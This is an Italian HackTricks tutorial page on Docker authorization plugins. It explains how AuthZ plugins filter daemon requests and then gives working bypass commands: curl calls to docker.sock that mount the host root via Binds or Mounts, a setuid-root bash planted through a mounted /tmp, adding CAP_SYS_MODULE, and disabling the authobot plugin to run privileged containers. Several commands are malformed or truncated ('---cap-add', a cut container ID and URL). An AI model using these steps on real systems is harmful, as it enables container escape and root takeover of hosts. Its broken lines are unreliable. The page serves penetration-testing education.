<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>


Il modello di **autorizzazione** predefinito di **Docker** è **tutto o niente**. Qualsiasi utente con il permesso di accedere al demone Docker può **eseguire qualsiasi** comando del client Docker. Lo stesso vale per i chiamanti che utilizzano l'API di Engine di Docker per contattare il demone. Se hai bisogno di un **maggiore controllo degli accessi**, puoi creare **plugin di autorizzazione** e aggiungerli alla configurazione del demone Docker. Utilizzando un plugin di autorizzazione, un amministratore di Docker può **configurare politiche di accesso granulari** per gestire l'accesso al demone Docker.

# Architettura di base

I plugin di autenticazione di Docker sono **plugin esterni** che puoi utilizzare per **consentire/negare** **azioni** richieste al demone Docker **in base** all'**utente** che lo ha richiesto e all'**azione** **richiesta**.

**[Le seguenti informazioni provengono dalla documentazione](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

Quando viene effettuata una **richiesta HTTP** al demone Docker tramite CLI o tramite l'API di Engine, il **sottosistema di autenticazione** invia la richiesta al/i **plugin di autenticazione** installato/i. La richiesta contiene l'utente (chiamante) e il contesto del comando. Il **plugin** è responsabile di decidere se **autorizzare** o **negare** la richiesta.

I diagrammi di sequenza di seguito rappresentano un flusso di autorizzazione consentito e un flusso di autorizzazione negato:

![Flusso di autorizzazione consentito](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![Flusso di autorizzazione negato](https://docs.docker.com/engine/extend/images/authz\_deny.png)

Ogni richiesta inviata al plugin **include l'utente autenticato, gli header HTTP e il corpo della richiesta/risposta**. Solo il **nome utente** e il **metodo di autenticazione** utilizzato vengono passati al plugin. In particolare, **non vengono passate credenziali utente o token**. Infine, **non tutti i corpi di richiesta/risposta vengono inviati** al plugin di autorizzazione. Vengono inviati solo i corpi di richiesta/risposta in cui il `Content-Type` è `text/*` o `application/json`.

Per i comandi che possono potenzialmente dirottare la connessione HTTP (`HTTP Upgrade`), come `exec`, il plugin di autorizzazione viene chiamato solo per le richieste HTTP iniziali. Una volta che il plugin approva il comando, l'autorizzazione non viene applicata al resto del flusso. In particolare, i dati in streaming non vengono passati ai plugin di autorizzazione. Per i comandi che restituiscono una risposta HTTP a blocchi, come `logs` e `events`, viene inviata solo la richiesta HTTP ai plugin di autorizzazione.

Durante l'elaborazione delle richieste/risposte, alcuni flussi di autorizzazione potrebbero richiedere ulteriori query al demone Docker. Per completare tali flussi, i plugin possono chiamare l'API del demone come un utente normale. Per abilitare queste query aggiuntive, il plugin deve fornire i mezzi per consentire a un amministratore di configurare le opportune politiche di autenticazione e sicurezza.

## Diversi plugin

Sei responsabile di **registrare** il tuo **plugin** come parte dell'avvio del demone Docker. Puoi installare **più plugin e concatenarli insieme**. Questa catena può essere ordinata. Ogni richiesta al demone passa in ordine attraverso la catena. Solo quando **tutti i plugin concedono l'accesso** alla risorsa, viene concesso l'accesso.

# Esempi di plugin

## Twistlock AuthZ Broker

Il plugin [**authz**](https://github.com/twistlock/authz) ti consente di creare un semplice file **JSON** che il **plugin** leggerà per autorizzare le richieste. Pertanto, ti offre l'opportunità di controllare molto facilmente quali endpoint API possono raggiungere ciascun utente.

Questo è un esempio che consentirà ad Alice e Bob di creare nuovi container: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

Nella pagina [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) puoi trovare la relazione tra l'URL richiesto e l'azione. Nella pagina [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) puoi trovare la relazione tra il nome dell'azione e l'azione stessa.

## Tutorial di plugin semplice

Puoi trovare un **plugin facile da capire** con informazioni dettagliate sull'installazione e il debug qui: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

Leggi il file `README` e il codice `plugin.go` per capire come funziona.

# Bypass del plugin di autenticazione di Docker

## Enumera l'accesso

Le principali cose da verificare sono **quali endpoint sono consentiti** e **quali valori di HostConfig sono consentiti**.

Per eseguire questa enumerazione puoi **utilizzare lo strumento** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**

## `run --privileged` non consentito

### Privilegi minimi
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### Esecuzione di un container e quindi ottenere una sessione privilegiata

In questo caso, l'amministratore di sistema **ha impedito agli utenti di montare volumi e eseguire container con il flag `--privileged` o di fornire qualsiasi capacità extra al container**:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
Tuttavia, un utente può **creare una shell all'interno del container in esecuzione e conferirgli privilegi aggiuntivi**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
Ora, l'utente può uscire dal container utilizzando una qualsiasi delle [**tecniche precedentemente discusse**](./#privileged-flag) e **aumentare i privilegi** all'interno dell'host.

## Montare una cartella scrivibile

In questo caso, l'amministratore di sistema **ha impedito agli utenti di eseguire container con il flag `--privileged`** o di fornire qualsiasi capacità extra al container, e ha consentito solo il montaggio della cartella `/tmp`:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
Nota che potresti non essere in grado di montare la cartella `/tmp`, ma puoi montare una **diversa cartella scrivibile**. Puoi trovare directory scrivibili usando: `find / -writable -type d 2>/dev/null`

**Nota che non tutte le directory in una macchina Linux supporteranno il bit suid!** Per verificare quali directory supportano il bit suid, esegui `mount | grep -v "nosuid"`. Ad esempio, di solito `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` e `/var/lib/lxcfs` non supportano il bit suid.

Nota anche che se puoi **montare `/etc`** o qualsiasi altra cartella **contenente file di configurazione**, puoi modificarli dal container Docker come root per **sfruttarli nell'host** ed elevare i privilegi (ad esempio modificando `/etc/shadow`).
{% endhint %}

## Endpoint API non controllato

La responsabilità dell'amministratore di sistema che configura questo plugin sarebbe quella di controllare quali azioni e con quali privilegi ogni utente può eseguire. Pertanto, se l'amministratore adotta un approccio **blacklist** con gli endpoint e gli attributi, potrebbe **dimenticarne alcuni** che potrebbero consentire a un attaccante di **elevare i privilegi**.

Puoi controllare l'API di Docker su [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## Struttura JSON non controllata

### Binds in root

È possibile che quando l'amministratore di sistema ha configurato il firewall di Docker abbia **dimenticato un parametro importante** dell'[**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) come "**Binds**".\
Nell'esempio seguente è possibile sfruttare questa errata configurazione per creare ed eseguire un container che monta la cartella root (/) dell'host:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
Nota come in questo esempio stiamo utilizzando il parametro **`Binds`** come chiave di livello radice nel JSON, ma nell'API appare sotto la chiave **`HostConfig`**
{% endhint %}

### Binds in HostConfig

Seguire le stesse istruzioni come con **Binds in root** eseguendo questa **richiesta** all'API di Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Montaggi nella root

Segui le stesse istruzioni come per **Montaggi nella root** eseguendo questa **richiesta** all'API di Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Montaggi in HostConfig

Segui le stesse istruzioni come con **Binds in root** eseguendo questa **richiesta** all'API di Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Attributo JSON non controllato

È possibile che quando l'amministratore di sistema ha configurato il firewall di Docker, **abbia dimenticato un attributo importante di un parametro** dell'[**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) come "**Capabilities**" all'interno di "**HostConfig**". Nell'esempio seguente è possibile sfruttare questa errata configurazione per creare ed eseguire un container con la capacità **SYS\_MODULE**:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
Il **`HostConfig`** è la chiave che di solito contiene i **privilegi** **interessanti** per evadere dal container. Tuttavia, come abbiamo discusso in precedenza, nota come l'utilizzo di Binds al di fuori di esso funzioni anche e potrebbe consentirti di aggirare le restrizioni.
{% endhint %}

## Disabilitazione del plugin

Se l'**amministratore di sistema** ha **dimenticato** di **proibire** la possibilità di **disabilitare** il **plugin**, puoi approfittarne per disabilitarlo completamente!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
Ricorda di **riattivare il plugin dopo l'escalation**, altrimenti un **riavvio del servizio docker non funzionerà**!

## Auth Plugin Bypass writeups

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

## Riferimenti

* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)


<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
